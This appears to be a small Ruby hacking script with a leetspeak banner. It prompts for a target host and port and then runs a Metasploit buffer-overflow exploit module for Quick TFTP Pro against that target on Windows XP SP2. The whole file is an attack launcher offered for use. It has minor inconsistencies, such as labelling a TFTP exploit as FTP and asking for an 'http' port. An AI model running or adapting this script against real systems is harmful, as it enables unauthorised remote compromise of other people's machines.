require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
     Quick FTP Pro 2.1 Transfer-Mode Overflow
				Windows XP SP2			
""".red
puts """
	      1st Try {set RPORT 80; 2nd FTP_RPORT 21?}
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the 'http' port? ".blue
print " [!] ---> ".yellow
port = gets.chomp
p


exec("msfconsole -x 'use exploit/windows/tftp/quick_tftp_pro_mode' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

